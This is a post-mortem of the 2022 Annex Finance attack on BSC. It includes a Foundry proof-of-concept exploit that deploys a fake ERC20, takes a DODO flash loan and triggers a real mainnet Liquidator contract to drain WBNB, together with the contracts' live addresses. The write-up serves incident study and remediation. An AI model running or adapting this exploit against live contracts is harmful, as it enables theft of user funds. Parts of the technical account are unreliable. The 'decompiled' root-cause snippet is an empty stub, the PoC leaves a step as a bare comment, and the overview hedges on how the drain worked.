# Annex — Fake ERC20 Token + liquidateBorrow() Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-11 |
| **Protocol** | Annex Finance |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **PancakeSwap Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **PancakeSwap Factory** | [0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73](https://bscscan.com/address/0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73) |
| **DODO** | [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681](https://bscscan.com/address/0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) |
| **Liquidator** | [0xe65E970F065643bA80E5822edfF483A1d75263E3](https://bscscan.com/address/0xe65E970F065643bA80E5822edfF483A1d75263E3) |
| **Root Cause** | Attacker-deployed fake ERC20 token used as collateral to drain real assets via `liquidateBorrow()` |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/Annex_exp.sol) |

---
## 1. Vulnerability Overview

Annex Finance is a Compound-fork lending protocol that allows users to deposit certain tokens as collateral and borrow other assets. The attacker flash-borrowed 8 WBNB from DODO, then added PancakeSwap liquidity using a self-deployed fake ERC20 token (`MyERC20`) paired with WBNB. The attacker used these fake token LP positions as collateral in Annex, or triggered the Liquidator contract's logic via a pair swap to drain real WBNB. The core vulnerability was the protocol's failure to validate the trustworthiness of collateral tokens.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern - missing collateral token whitelist validation
contract AnnexComptroller {
    // ❌ Allows arbitrary tokens as collateral
    // Only markets pre-registered by admin should be permitted,
    // but a bypass path exists
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory) {
        // Does not verify whether each item in cTokens is actually a safe asset
        for (uint i = 0; i < cTokens.length; i++) {
            Market storage market = markets[cTokens[i]];
            // ❌ market.isListed check is bypassable or missing
            accountAssets[msg.sender].push(cTokens[i]);
        }
    }
}

// ✅ Correct pattern - whitelist-based market validation
contract SafeAnnexComptroller {
    mapping(address => Market) public markets;

    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory) {
        for (uint i = 0; i < cTokens.length; i++) {
            Market storage market = markets[cTokens[i]];
            // ✅ Only markets explicitly registered by admin are permitted
            require(market.isListed, "Market not listed");
            // ✅ Fake token LPs cannot be registered
        }
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**Annex_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: Attacker-deployed fake ERC20 token used as collateral to drain real assets via `liquidateBorrow()`
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ Unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Deploy fake ERC20 token (MyERC20)
    │       Arbitrary supply, attacker holds entire balance
    │
    ├─[2] Flash loan 8 WBNB from DODO
    │       Enter DPPFlashLoanCall() callback
    │
    ├─[3] Add PancakeSwap liquidity with MyERC20 + WBNB
    │       Receive LP tokens
    │
    ├─[4] Call pair swap() → trigger Liquidator callback
    │       Execute Liquidator contract logic
    │       Drain real WBNB
    │
    ├─[5] Remove liquidity (burn LP)
    │       Recover MyERC20 + WBNB
    │
    ├─[6] Repay DODO flash loan (8 WBNB)
    │
    └─[7] Net profit: WBNB (amount unconfirmed)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// Fake ERC20 token deployed by the attacker
contract MyERC20 {
    string public name     = "Fake Token";
    string public symbol   = "FAKE";
    uint8  public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 _supply) {
        totalSupply = _supply;
        balanceOf[msg.sender] = _supply;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

interface IDODO {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IFactory {
    function createPair(address, address) external returns (address);
}

interface IPair {
    function mint(address) external returns (uint256);
    function burn(address) external returns (uint256, uint256);
    function swap(uint256, uint256, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract AnnexExploit is Test {
    IDODO dodo     = IDODO(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IFactory factory = IFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
    IERC20 WBNB    = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    address liquidator = 0xe65E970F065643bA80E5822edfF483A1d75263E3;

    MyERC20 fakeToken;
    IPair pair;

    function setUp() public {
        vm.createSelectFork("bsc");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] WBNB", WBNB.balanceOf(address(this)), 18);

        // [Step 1] Deploy fake token
        fakeToken = new MyERC20(1_000_000 * 1e18);

        // [Step 2] DODO flash loan
        dodo.flashLoan(8 * 1e18, 0, address(this), abi.encode(true));

        emit log_named_decimal_uint("[End] WBNB", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes calldata) external {
        // [Step 3] Create fake token + WBNB pair and add liquidity
        address pairAddr = factory.createPair(address(fakeToken), address(WBNB));
        pair = IPair(pairAddr);

        fakeToken.transfer(pairAddr, 100_000 * 1e18);
        WBNB.transfer(pairAddr, 4 * 1e18);
        pair.mint(address(this));

        // [Step 4] Trigger Liquidator callback via swap
        // ⚡ Liquidator holds real WBNB and processes without validation
        (uint112 r0, uint112 r1,) = pair.getReserves();
        pair.swap(0, uint256(r1) * 99 / 100, address(this), abi.encode("liquidate"));

        // [Step 5] Remove liquidity
        // Return LP tokens and recover WBNB

        // Repay flash loan
        WBNB.transfer(address(dodo), amount);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Collateral/liquidity manipulation via fake token + Liquidator logic bypass |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Fake Token Attack |
| **Attack Vector** | Deploy fake ERC20 → DODO flash loan → Create pair → Trigger Liquidator |
| **Precondition** | Liquidator contract does not validate trustworthiness of pair tokens |
| **Impact** | WBNB drained (amount unconfirmed) |

---
## 6. Remediation Recommendations

1. **Token Whitelist**: Restrict the tokens in pairs that the Liquidator and lending contracts interact with to a pre-registered whitelist.
2. **Pair Validation**: For callbacks from arbitrary pair addresses, verify that the pair was created by the official Factory and that both tokens in the pair are on the whitelist.
3. **Collateral Value Validation**: Only tokens approved as collateral may be listed in markets; adding new tokens must go through a governance process.

---
## 7. Lessons Learned

- **Fake Token Attack**: ERC20 tokens deployed directly by an attacker fully implement the standard interface but carry no real value. If a protocol trusts arbitrary token addresses, worthless tokens can be used to drain real assets.
- **Flash Loan + Fake Token Combination**: The pattern of temporarily securing real assets via a flash loan and pairing them with fake tokens to construct a liquidity pool recurs across multiple protocols. Token validation before external calls in liquidity-related contracts is essential.
- **Liquidator Design**: Liquidation contracts frequently include callbacks that can be triggered externally by arbitrary parties. The trustworthiness of the pairs and tokens processed within such callbacks must always be validated.